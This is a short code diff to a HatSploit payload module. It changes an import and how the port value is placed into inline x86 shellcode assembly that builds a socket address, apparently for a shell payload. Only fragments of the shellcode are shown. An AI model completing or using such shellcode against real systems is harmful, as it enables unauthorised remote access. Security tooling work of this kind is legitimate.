@@ -3,7 +3,7 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 from pex.assembler import Assembler
 from pex.socket import Socket
 
@@ -53,8 +53,6 @@ class HatSploitPayload(Payload, Assembler, Socket):
         )
 
     def run(self):
-        port = self.pack_port(self.handler['BPORT'])
-
         return self.assemble(
             self.details['Architecture'],
             f"""
@@ -72,7 +70,7 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 pop ebx
                 pop esi
                 push edx
-                push 0x{port.hex()}0002
+                push 0x{self.rport.little.hex()}0002
                 push 0x10
                 push ecx
                 push eax
